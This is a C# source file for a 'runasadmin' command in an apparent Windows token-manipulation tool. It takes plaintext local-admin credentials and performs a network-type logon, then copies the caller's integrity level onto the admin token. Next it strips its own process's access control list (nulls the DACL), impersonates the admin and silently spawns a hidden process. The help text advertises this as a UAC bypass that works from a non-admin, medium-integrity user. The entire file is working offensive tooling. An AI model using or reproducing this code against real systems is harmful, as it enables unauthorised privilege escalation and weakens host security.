using System.Runtime.InteropServices;
using Microsoft.Win32.SafeHandles;
using Windows.Win32.Security;
using Windows.Win32.System.Threading;
using Windows.Win32.Foundation;
using PointyTokenz.Domain;
using System.Security.Principal;

using static Windows.Win32.PInvoke;

namespace PointyTokenz.Commands
{
    public class RunAsAdmin : ICommand
    {
        public static string CommandName => "runasadmin";
        public unsafe void Execute(Dictionary<string, string> arguments)
        {
            Console.WriteLine("\r\n[*] Command: runasadmin\r\n");
            // Check if the /help argument is present
            if (arguments.ContainsKey("/help"))
            {
                Console.WriteLine("Action:");
                Console.WriteLine(" Run a command as an administrator with elevated privileges using plaintext credentials.");
                Console.WriteLine(" Credits to @antonioCoco for the technique (https://github.com/antonioCoco/RunasCs/)\r\n");

                Console.WriteLine("Requirements:");
                Console.WriteLine(" Requires plaintext credentials of a local administrator user, not necessarily RID-500.\r\n");

                Console.WriteLine("Purpose:");
                Console.WriteLine(" This is useful for running a command as an administrator without having to interactively log in.");
                Console.WriteLine(" This command also bypasses UAC and results in an elevated process, and is usable even from a non admin user in medium integrity.\r\n");

                Console.WriteLine("Options:");
                Console.WriteLine(" /username:<username>  - The username to run the command as (local admin required). (required)");
                Console.WriteLine(" /password:<password>  - The password of the user. (required)");
                Console.WriteLine(" /domain:<domain>      - The domain of the user. (optional, defaults to machine name)");
                Console.WriteLine(" /command:<command>    - The command to run as the user. (optional, defaults to cmd.exe)");
                Console.WriteLine(" /help                 - Show this help message.\r\n");

                return;
            }
            // Check if the /user argument is present, case insensitive
            if (arguments.ContainsKey("/username") == false)
            {
                Console.WriteLine("[x] The /username argument is required.");
                return;
            }
            // Check if the /password argument is present
            if (arguments.ContainsKey("/password") == false)
            {
                Console.WriteLine("[x] The /password argument is required.");
                return;
            }

            // Get the username and password
            string username = arguments["/username"];
            string password = arguments["/password"];

            // Get the domain, set to the computer name if not specified (it must NOT be null)
            string domain = Environment.MachineName;
            if (arguments.ContainsKey("/domain"))
            {
                domain = arguments["/domain"];
            }

            // Check if /command exists, otherwise default to cmd.exe
            string commandLine = "C:\\Windows\\System32\\cmd.exe";
            if (arguments.ContainsKey("/command"))
            {
                commandLine = arguments["/command"];
            }

            // Create a null-terminated char array
            char[] commandLineBuffer = new char[commandLine.Length + 1];

            // Copy the command string into the array
            commandLine.AsSpan().CopyTo(commandLineBuffer);

            // Span<char> wrapping the buffer (null terminator is already there as default)
            Span<char> commandLineSpan = commandLineBuffer;

            // Call LogonUser to open a session with the admin plaintext credentials
            // LOGON32_LOGON_NETWORK is not filtered by UAC, and works both locally and remotely
            if (!LogonUser(username, domain, password, LOGON32_LOGON.LOGON32_LOGON_NETWORK, LOGON32_PROVIDER.LOGON32_PROVIDER_DEFAULT, out SafeFileHandle adminToken))
            {
                Console.WriteLine($"[x] LogonUser failed: {Marshal.GetLastWin32Error()}");
                return;
            }

            // Print the token information
            Console.WriteLine("[*] Admin token information:");
            PrintTokenInformation(adminToken);

            // Get a handle to our own primary token
            HANDLE procHandle = GetCurrentProcess();
            SafeProcessHandle safeProcessHandle = new SafeProcessHandle(procHandle, true);
            SafeFileHandle myToken;

            if (!OpenProcessToken(safeProcessHandle, TOKEN_ACCESS_MASK.TOKEN_QUERY, out myToken))
            {
                Console.WriteLine($"[x] OpenProcessToken failed: {Marshal.GetLastWin32Error()}");
                return;
            }

            // Print our own token information
            Console.WriteLine("\r\n[*] Current token information:");
            PrintTokenInformation(myToken);

            // Set the integrity level of the token to to our current process's integrity level
            // Get the TOKEN_MANDATORY_LABEL of our own token
            if (!Helpers.TokenInfo(myToken, TOKEN_INFORMATION_CLASS.TokenIntegrityLevel, out TOKEN_MANDATORY_LABEL tokenIntegrity))
            {
                Console.WriteLine("[x] Failed to retrieve token integrity level.");
            }

            // Apply this integrity level to the admin token
            if (!SetTokenInformation(adminToken, TOKEN_INFORMATION_CLASS.TokenIntegrityLevel, &tokenIntegrity, (uint)Marshal.SizeOf(tokenIntegrity)))
            {
                Console.WriteLine($"[x] SetTokenInformation failed: {Marshal.GetLastWin32Error()}");
                return;
            }

            // Print the new token information
            Console.WriteLine("\r\n[*] New Admin token information:");
            PrintTokenInformation(adminToken);

            // We then have to nuke the ACL on our own process, trust me its safe bro
            SetSecurityInfo(safeProcessHandle, Windows.Win32.Security.Authorization.SE_OBJECT_TYPE.SE_KERNEL_OBJECT, OBJECT_SECURITY_INFORMATION.DACL_SECURITY_INFORMATION, null, null, null, null);

            // Impersonate the admin token
            if (!ImpersonateLoggedOnUser(adminToken))
            {
                Console.WriteLine($"[x] ImpersonateLoggedOnUser failed: {Marshal.GetLastWin32Error()}");
                return;
            }

            // Define the STARTUPINFO and PROCESS_INFORMATION structs
            var startupInfo = new STARTUPINFOW
            {
                dwFlags = STARTUPINFOW_FLAGS.STARTF_USESHOWWINDOW,
                wShowWindow = 0, // SW_HIDE
                                 // SW_SHOW = 5, required for GUI apps?
                cb = (uint)Marshal.SizeOf<STARTUPINFOW>()
            };

            var procInfo = new PROCESS_INFORMATION();
            CREATE_PROCESS_LOGON_FLAGS logonType = CREATE_PROCESS_LOGON_FLAGS.LOGON_NETCREDENTIALS_ONLY; // Default logon flag

            // Spawn a new hidden process with plaintext credentials using CreateProcessWithLogon
            if (!CreateProcessWithLogon(username, domain, password, logonType, null, ref commandLineSpan, PROCESS_CREATION_FLAGS.CREATE_NO_WINDOW, null, null, startupInfo, out procInfo))
            {
                Console.WriteLine($"[x] Failed to spawn the process with CreateProcessWithLogon : {Marshal.GetLastWin32Error()}");
                return;
            }
            Console.WriteLine($"\r\n[*] Successfully spawned process {commandLine} as {domain}\\{username}");
            Console.WriteLine("Process ID : {0}", procInfo.dwProcessId);
            Console.WriteLine("Thread ID  : {0}", procInfo.dwThreadId);
            Console.WriteLine("Logon type : {0}\r\n", logonType);

            // Clean up
            RevertToSelf();
            adminToken.Dispose();
            myToken.Dispose();
            safeProcessHandle.Dispose();
        }
        static unsafe void PrintTokenInformation(SafeFileHandle tokenHandle)
        {
            SecurityIdentifier sid;
            NTAccount user;
            // Get the TOKEN_USER structure using the helper function
            if (Helpers.TokenInfo(tokenHandle, TOKEN_INFORMATION_CLASS.TokenUser, out TOKEN_USER tokenUser))
            {
                // Getting the user's SID and translating it to an NTAccount
                sid = new SecurityIdentifier(tokenUser.User.Sid);
                user = (NTAccount)sid.Translate(typeof(NTAccount));
                Console.WriteLine("User                : {0}", user.Value);
                Console.WriteLine("SID                 : {0}", sid.Value);
            }
            else
            {
                Console.WriteLine("[x] Failed to retrieve token user information.");
            }

            if (!Helpers.TokenInfo(tokenHandle, TOKEN_INFORMATION_CLASS.TokenIntegrityLevel, out TOKEN_MANDATORY_LABEL tokenIntegrity))
            {
                Console.WriteLine("[x] Failed to retrieve token integrity level.");
            }

            var subAuthCount = GetSidSubAuthorityCount(tokenIntegrity.Label.Sid);
            var subAuth = GetSidSubAuthority(tokenIntegrity.Label.Sid, (uint)*subAuthCount - 1);

            // Get the token elevation
            if (!Helpers.TokenInfo(tokenHandle, TOKEN_INFORMATION_CLASS.TokenElevation, out TOKEN_ELEVATION tokenElevation))
            {
                Console.WriteLine("[x] Failed to retrieve token elevation.");
            }

            // Get the token elevation type
            if (!Helpers.TokenInfo(tokenHandle, TOKEN_INFORMATION_CLASS.TokenElevationType, out TOKEN_ELEVATION_TYPE tokenElevationType))
            {
                Console.WriteLine("[x] Failed to retrieve token elevation type.");
            }

            switch (*subAuth)
            {
                case >= SECURITY_MANDATORY_SYSTEM_RID:
                    Console.WriteLine("Integrity Level     : SYSTEM");
                    break;

                case >= SECURITY_MANDATORY_HIGH_RID:
                    Console.WriteLine("Integrity Level     : High");
                    break;

                case >= SECURITY_MANDATORY_MEDIUM_RID:
                    Console.WriteLine("Integrity Level     : Medium");
                    break;

                case >= SECURITY_MANDATORY_LOW_RID:
                    Console.WriteLine("Integrity Level     : Low");
                    break;

                default:
                    Console.WriteLine("Integrity Level     : Untrusted");
                    break;
            }

            Console.WriteLine("Is Elevated         : {0}", tokenElevation.TokenIsElevated != 0 ? "True" : "False");
            Console.WriteLine("Elevation Type      : {0}", tokenElevationType);

        }
    }
}
